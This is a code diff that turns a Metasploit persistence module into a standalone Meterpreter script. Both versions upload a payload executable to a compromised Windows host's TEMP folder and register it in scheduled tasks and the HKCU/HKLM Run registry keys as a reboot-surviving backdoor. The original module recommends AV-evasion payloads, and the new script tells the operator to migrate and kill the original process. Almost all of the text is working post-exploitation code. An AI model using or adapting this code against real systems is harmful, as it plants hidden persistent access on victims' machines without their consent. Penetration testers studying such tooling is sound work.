@@ -1,106 +1,55 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
-# Current source: https://github.com/rapid7/metasploit-framework
+# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
+# If you'd like to imporve this script, please try to port it as a post
+# module instead. Thank you.
 ##
 
-require 'msf/core'
-require 'rex'
-require 'msf/core/post/common'
-require 'msf/core/post/file'
-require 'msf/core/post/windows/priv'
-require 'msf/core/post/windows/registry'
-require 'msf/core/exploit/exe'
 
-class Metasploit3 < Msf::Exploit::Local
-  Rank = ExcellentRanking
 
-  include Msf::Post::Common
-  include Msf::Post::File
-  include Msf::Post::Windows::Priv
-  include Msf::Post::Windows::Registry
-  include Exploit::EXE
+# Author/Contributors: 
+# Ben Turner
+# Carlos Perez at carlos_perez[at]darkoperator.com
+#-------------------------------------------------------------------------------
+################## Variable Declarations ##################
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Windows Manage Persistent Payload Installer',
-      'Description'   => %q{
-        This Module will create a boot persistent reverse Meterpreter session by
-        installing on the target host the payload as a script that will be executed
-        at user logon or system startup depending on privilege and selected startup
-        method. For best performance, set a EXE::Custom payload of either a .exe or .bat file generated with AV evasion techniques. Additionally set your own payload handler. 
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        =>
-        [
-          'Ben Turner',
-          'Carlos Perez <carlos_perez[at]darkoperator.com>'
-        ],
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ],
-      'Targets'       => [ [ 'Windows', {} ] ],
-      'DefaultTarget' => 0,
-      'DisclosureDate'=> "Mar 19 2015"
-    ))
+# Meterpreter Session
+@client = client
 
-    register_options(
-      [
-        OptInt.new('DELAY', [true, 'Delay in minutes for persistent payload to reconnect.', 2]),
-        OptString.new('NAME', [true, 'Name of the scheduled task and registry key.', 'update-svc-msf']),
-        OptBool.new('UNINSTALL', [false, 'Set this option if the persistence is to be removed.']),
-      ], self.class)
-  end
+# Default parameters for payload
+name = "update-svc-msf"
+delay = 5
+unin = false
+cusext = ".exe"
+cusexe = ""
 
-  # Exploit Method for when exploit command is issued
+@exec_opts = Rex::Parser::Arguments.new(
+  "-h"  => [ true,  "This help menu"],
+  "-x"  => [ true,   "The path to the Custom EXE or BAT file to use for persistence, e.g. -x /root/msf.exe"],
+  "-c"  => [ true,   "The extension of the Custom EXE, e.g. -c bat"],
+  "-d"  => [ true,   "The delay on the scheduled task in minutes"],
+  "-n"  => [ true,   "The name of the task and registry key on the host"],
+  "-u"  => [ true,   "The interval in seconds between each connection attempt"]
+)
+meter_type = client.platform
 
-  def exploit
-    print_status("Running module against #{sysinfo['Computer']}")
-    delay = datastore['DELAY']
-    name = datastore['NAME']
-    unin = datastore['UNINSTALL']
-    cusext = ::File.extname(datastore['EXE::Custom'])
-    execus = datastore['EXE::Custom'].to_s
-    host,port = session.session_host, session.session_port
+################## Function Declarations ##################
 
-    # If the uninstall flag is set, remove the persistence
-    if unin == true
-      print_status("Removing scheduled task from #{sysinfo['Computer']}")
-      run_cmd("schtasks /delete /f /tn #{name}")
-      delete_reg("HKCU", name)
-      delete_reg("HKLM", name)
-
-    else
-      print_status("To remove persistence set UNINSTALL => true")
-      unless execus.empty?
-        exe = get_custom_exe
-      else
-        exe = generate_payload_exe
-      end
-
-      # uploads the payload to the host
-      script_on_target = write_script_to_target(exe, cusext)
-
-      # exit the module because we failed to write the file on the target host.
-      return unless script_on_target
-
-      # install new scheduled tasks (removes any previously installed tasks first) 
-      print_status("Running module against #{sysinfo['Computer']}")
-      run_cmd("schtasks /delete /f /tn #{name}")
-      run_cmd("schtasks /create /sc minute /mo #{delay} /tn #{name} /tr #{script_on_target}")
-
-      # attempts to write the registry values to the system
-      write_to_reg("HKCU", script_on_target, name)
-      write_to_reg("HKLM", script_on_target, name)
-    end
+  # Usage Message Function
+  #-------------------------------------------------------------------------------
+  def usage
+    print_line "Meterpreter script to create a persistent backdoor on a target host."
+    print_line(@exec_opts.usage)
+    raise Rex::Script::Completed
   end
 
   ##
   # uploads the payload to the host with the correct extension
   ##
 
-  def write_script_to_target(payloadsource, ext)
-    tempdir = datastore['PATH'] || session.sys.config.getenv('TEMP')
-    tempfile = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ext
-
+  def write_to_target(payloadsource, ext)
+    tempdir = @client.sys.config.getenv('TEMP')
+    tempfile = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + "." + ext
+    #print_good(tempdir +" "+ tempfile)
     begin
       write_file(tempfile, payloadsource)
       print_good("Persistent Script written to #{tempfile}")
@@ -112,7 +61,6 @@ class Metasploit3 < Msf::Exploit::Local
     end
     return tempfile
   end
-
   ##
   # The write registry function
   ##
@@ -120,7 +68,6 @@ class Metasploit3 < Msf::Exploit::Local
   def write_to_reg(key, script_on_target, registry_value)
     nam = registry_value
     key_path = "#{key.to_s}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-    print_status("Installing key into autorun: #{key_path}\\#{nam}")
     if key && registry_setvaldata(key_path, nam, script_on_target, "REG_SZ")
       print_good("Installed key into autorun: #{key_path}\\#{nam}")
       return true
@@ -163,4 +110,51 @@ class Metasploit3 < Msf::Exploit::Local
     return res
   end
 
-end
+
+################## Main ##################
+@exec_opts.parse(args) { |opt, idx, val|
+  case opt
+  when "-h"
+    usage
+  when "-x"
+    cusexe = val.to_s
+  when "-n"
+    name = val.to_s
+  when "-c"
+    cusext = val.to_s
+  when "-u"
+    unin = true
+  when "-d"
+    delay = val.to_i
+  end
+}
+
+    print_status("Running module against " + @client.session_host)
+    print("\n")
+
+    # If the uninstall flag is set, remove the persistence
+    if unin == true
+      print_status("Removing scheduled task from " + @client.session_host)
+      run_cmd("schtasks /delete /f /tn #{name}")
+      delete_reg("HKCU", name)
+      delete_reg("HKLM", name)
+
+    else
+      # uploads the payload to the host
+      script_on_target = write_to_target(cusexe, cusext)
+
+      # exit the module because we failed to write the file on the target host.
+      return unless script_on_target
+
+      # install new scheduled tasks (removes any previously installed tasks first) 
+      run_cmd("schtasks /delete /f /tn #{name}")
+      run_cmd("schtasks /create /sc minute /mo #{delay} /tn #{name} /tr #{script_on_target}")
+      print_good("Installed scheduled (" + name + ") task on " + @client.session_host)
+
+      # attempts to write the registry values to the system
+      write_to_reg("HKCU", script_on_target, name)
+      write_to_reg("HKLM", script_on_target, name)
+      print("\n")
+      print_status("Create your multi handler, your persistence will not re-run if you do not migrate the session and kill the original process, use 'migrate -f -k'")
+      print_status("To remove persistence add the -u option")
+    end
